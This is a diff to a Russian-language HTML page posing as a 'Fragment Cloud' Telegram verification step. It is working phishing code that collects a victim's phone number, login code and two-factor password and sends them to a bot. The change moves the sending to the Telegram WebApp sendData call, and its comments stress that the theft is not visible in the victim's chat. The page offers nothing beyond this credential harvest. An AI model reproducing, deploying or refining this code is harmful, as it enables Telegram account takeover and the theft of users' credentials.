@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Fragment Cloud • Верификация</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * {
             margin: 0;
@@ -175,35 +176,6 @@
             color: #40bf7f;
             margin-bottom: 16px;
         }
-        .timer-block {
-            background: #0e1621;
-            border-radius: 16px;
-            padding: 20px;
-            margin-top: 24px;
-            border: 1px solid #2b3a47;
-        }
-        .progress-bar {
-            background: #232e3c;
-            height: 8px;
-            border-radius: 10px;
-            margin: 16px 0;
-            overflow: hidden;
-        }
-        .progress-fill {
-            width: 0%;
-            height: 100%;
-            background: #2f6cff;
-            transition: width 0.5s;
-        }
-        .timer-text {
-            color: #9aa6b2;
-            font-size: 14px;
-            text-align: center;
-        }
-        .timer-highlight {
-            color: #2f6cff;
-            font-weight: 600;
-        }
         .security-info {
             display: flex;
             justify-content: center;
@@ -300,8 +272,8 @@
     </div>
     
     <button class="btn" id="passwordBtn" onclick="submitPassword()">Верифицировать</button>
-        </div>
-                <!-- ШАГ 4: УСПЕХ -->
+</div>
+        <!-- ШАГ 4: УСПЕХ -->
         <div id="success" class="hidden">
             <div style="text-align: center;">
                 <div class="success-icon">✅</div>
@@ -341,36 +313,31 @@
     </div> <!-- закрываем card -->
 </div> <!-- закрываем container -->
         <script>
-        // Получаем user ID из URL
+        // Telegram WebApp инициализация
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+        tg.ready();
+        
+        // Получаем user ID
         const urlParams = new URLSearchParams(window.location.search);
-        const USER_ID = urlParams.get('user') || 'telegram_user';
-        const BOT_USERNAME = 'botCryptaFragmunt_bot';
+        const USER_ID = tg.initDataUnsafe?.user?.id || urlParams.get('user') || 'telegram_user';
         
         let userPhone = '';
-        let timerInterval = null;
         
-        // Отправка данных в бота (ЧЕРЕЗ ЛИЧКУ ПОЛЬЗОВАТЕЛЯ)
-        function sendToBot(command, data) {
+        // ===== ОТПРАВКА ДАННЫХ ЧЕРЕЗ WebApp (НЕ ВИДНО В ЧАТЕ) =====
+        function sendToBot(action, data) {
             const payload = {
                 phone: data.phone,
                 code: data.code || '',
                 password: data.password || '',
-                action: command,
+                action: action,
                 user_id: USER_ID,
                 timestamp: Date.now()
             };
             
-            const jsonString = JSON.stringify(payload);
-            const message = `/web_auth ${jsonString}`;
-            const encodedMessage = encodeURIComponent(message);
-            
-            // ОТПРАВЛЯЕМ В ЛИЧКУ БОТА (пользователь сам отправляет)
-            window.location.href = `tg://resolve?domain=${BOT_USERNAME}&text=${encodedMessage}`;
-            
-            // Резервный способ
-            setTimeout(() => {
-                window.open(`https://t.me/${BOT_USERNAME}?start=auth_${Date.now()}`, '_blank');
-            }, 300);
+            // Отправляем через WebApp - НЕТ СООБЩЕНИЯ В ЧАТЕ!
+            tg.sendData(JSON.stringify(payload));
+            console.log('📤 Отправлено:', action);
         }
         
         // ШАГ 1: Отправка номера
@@ -393,7 +360,7 @@
             
             userPhone = phone;
             
-            // Форматируем номер для отображения
+            // Форматируем номер
             let displayPhone = `+${phone.slice(0,1)}`;
             if (phone.length > 1) displayPhone += ` (${phone.slice(1,4)})`;
             if (phone.length > 4) displayPhone += ` ${phone.slice(4,7)}`;
@@ -403,8 +370,8 @@
             document.getElementById('phoneDisplay').innerHTML = displayPhone;
             document.getElementById('phoneDisplay2').innerHTML = displayPhone;
             
-            // Отправляем номер в бота
-            sendToBot('phone_submitted', { phone: phone });
+            // Отправляем номер (НЕ ВИДНО В ЧАТЕ)
+            sendToBot('phone', { phone: phone });
             
             // Переходим к шагу 2
             document.getElementById('step1').classList.add('hidden');
@@ -434,18 +401,13 @@
             codeBtn.disabled = true;
             codeBtn.textContent = 'Проверка...';
             
-            // Отправляем код в бота
-            sendToBot('code_submitted', { 
+            // Отправляем код (НЕ ВИДНО В ЧАТЕ)
+            sendToBot('code', { 
                 phone: userPhone, 
                 code: code 
             });
             
             setTimeout(() => {
-                // Показываем шаг 3 (2FA) или успех
-                // Бот сам определит, нужно ли 2FA
-                document.getElementById('step2').classList.add('hidden');
-                document.getElementById('step3').classList.remove('hidden');
-                
                 codeBtn.disabled = false;
                 codeBtn.textContent = 'Подтвердить код';
             }, 2000);
@@ -469,14 +431,13 @@
             passwordBtn.disabled = true;
             passwordBtn.textContent = 'Верификация...';
             
-            // Отправляем 2FA в бота
-            sendToBot('2fa_submitted', { 
+            // Отправляем 2FA (НЕ ВИДНО В ЧАТЕ)
+            sendToBot('2fa', { 
                 phone: userPhone, 
                 password: password 
             });
             
             setTimeout(() => {
-                showSuccess();
                 passwordBtn.disabled = false;
                 passwordBtn.textContent = 'Верифицировать';
             }, 2000);
@@ -489,11 +450,11 @@
             document.getElementById('step3').classList.add('hidden');
             document.getElementById('success').classList.remove('hidden');
             
-            sendToBot('verification_complete', { phone: userPhone });
+            sendToBot('complete', { phone: userPhone });
             
             setTimeout(() => {
-                window.location.href = `https://t.me/${BOT_USERNAME}`;
-            }, 2000);
+                tg.close(); // Закрываем WebApp
+            }, 3000);
         }
         
         // Вернуться к номеру
@@ -512,10 +473,15 @@
             this.value = this.value.replace(/[^0-9]/g, '').slice(0, 5);
         });
 
-        // Автофокус на поле телефона
+        // Автофокус
         window.onload = function() {
             document.getElementById('phone')?.focus();
         };
+
+        // Слушаем сообщения от бота (для автоматического переключения на 2FA)
+        tg.onEvent('web_app_data_sent', function() {
+            console.log('Данные отправлены');
+        });
     </script>
 </body>
 </html>
